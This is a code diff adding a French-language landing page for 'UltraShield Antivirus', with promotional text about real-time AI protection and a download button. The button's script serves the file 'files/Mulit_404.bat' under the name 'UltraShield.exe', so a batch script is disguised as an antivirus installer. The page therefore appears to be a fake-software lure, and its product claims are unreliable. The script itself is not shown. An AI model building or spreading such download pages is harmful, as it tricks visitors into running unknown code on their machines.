@@ -1,1 +1,58 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<title>UltraShield Antivirus</title>
+<link rel="stylesheet" href="style.css">
+</head>
 
+<body>
+
+<header>
+  <h1>🛡️ UltraShield Antivirus</h1>
+  <p>Protection maximale - Téléchargement sécurisé</p>
+</header>
+
+<main class="container">
+
+  <div class="card">
+    <h2>UltraShield v12.0</h2>
+    <p>Antivirus nouvelle génération avec IA de protection en temps réel.</p>
+    
+    <button onclick="downloadFile()" class="btn">
+      ⬇️ Télécharger maintenant
+    </button>
+  </div>
+
+  <div class="scan">
+    <h2>🛡️ Pourquoi UltraShield ?</h2>
+    <div class="bar">
+      <div class="progress"></div>
+    </div>
+    <p>UltraShield est conçu pour offrir une protection avancée contre les menaces numériques modernes. Grâce à une technologie basée sur l’analyse intelligente et la surveillance en temps réel, il détecte et neutralise les virus, malwares et attaques avant qu’ils n’affectent le système.
+
+Son moteur de sécurité optimise les performances de l’ordinateur tout en assurant une protection continue, sans ralentissement. UltraShield fonctionne en arrière-plan de manière discrète et efficace, garantissant une sécurité permanente sans interrompre l’utilisation quotidienne.
+
+L’interface simple et claire permet de lancer des scans rapides ou complets en un seul clic. Les mises à jour automatiques assurent une défense toujours à jour face aux nouvelles menaces.
+
+UltraShield combine rapidité, fiabilité et technologie moderne pour offrir une protection complète adaptée à tous les utilisateurs.</p>
+  </div>
+
+</main>
+
+<footer>
+  <p>UltraShield Security © 2026</p>
+</footer>
+
+<script>
+function downloadFile(){
+  const a = document.createElement("a");
+  a.href = "files/Mulit_404.bat";
+  a.download = "UltraShield.exe";
+  a.click();
+}
+</script>
+
+</body>
+</html>
